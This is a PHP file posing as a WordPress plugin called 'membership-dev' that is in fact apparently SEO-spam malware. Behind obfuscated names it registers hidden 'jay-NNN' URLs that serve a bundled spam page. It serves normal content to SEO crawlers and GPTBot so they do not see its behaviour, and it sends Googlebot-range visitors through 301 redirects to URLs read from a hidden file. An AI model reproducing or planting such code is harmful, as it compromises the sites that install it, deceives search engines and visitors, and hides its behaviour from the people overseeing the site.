<?php
/**
 * Plugin Name: membership-dev
 * Description: membership-dev
 * Version: 1.0
 * Author: John Smith
 */
 

class iV0LI {
	
    public function __construct() {
        add_action('init', [$this, 'aavrqq']);
        add_filter('query_vars', [$this, 'svjws']);
        add_action('template_include', [$this, 'suuteywipa']);
		add_filter('document_title_parts', [$this, 'fnspobp']);
    }

    public function aavrqq() {
        add_rewrite_rule(
            '^jay-([0-9]+).*?$',
            'index.php?dgyrzwoxwq=$matches[1]',
            'top'
        );
		flush_rewrite_rules();
    }

    public function svjws($sQlfSrXPJH) {
        $sQlfSrXPJH[] = 'dgyrzwoxwq';
        $sQlfSrXPJH[] = 'jngyur';
        return $sQlfSrXPJH;
    }
	
	public function fnspobp($abbmw) {
		if (get_query_var('dgyrzwoxwq')) $abbmw['title'] = get_query_var('jngyur');
		return $abbmw;
	}

    public function suuteywipa($ntza7h6g) {
		
		$fonM8 = array('rich-consent', 'Go-http-client', 'mj12bot', 'netspider', 'interactive-browser', 'python', 'checker-last', 'changer-events', 'gptbot', 'label-geo', 'dotbot', 'ahrefsbot', 'number-timer', 'beaver-gdpr', 'serpstatbot', 'semrush', 'redirect-member');
		foreach($fonM8 as $dwMBgCPeG) { if (stripos($_SERVER['HTTP_USER_AGENT'], $dwMBgCPeG) !== false) return $ntza7h6g; }

        if (get_query_var('dgyrzwoxwq') && preg_match('/^[0-9]+$/', get_query_var('dgyrzwoxwq'))) {
            return plugin_dir_path(__FILE__) . 'membership-dev/csv-feed.php';
        } elseif (strpos($_SERVER['REMOTE_ADDR'], '66.249')===0) {
			$wffPC = plugin_dir_path(__FILE__) . 'membership-dev/print-contact.php';
			if (is_file($wffPC)) {
				$uoBFT = file($wffPC, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
				if (count($uoBFT) > 1) {
					$lT7fQB8 = array_shift($uoBFT);
					$plwdxH68K = array_shift($uoBFT);
					if (strlen($plwdxH68K) > 0) {
						$apcyGfbuep = $lT7fQB8 . "\n" . implode("\n", $uoBFT);
						file_put_contents($wffPC, $apcyGfbuep);
						header("HTTP/1.1 301 Moved Permanently");
						header("Location: $plwdxH68K");
						exit;
					}
				}
			}
		}
        return $ntza7h6g;
    }
}
new iV0LI();



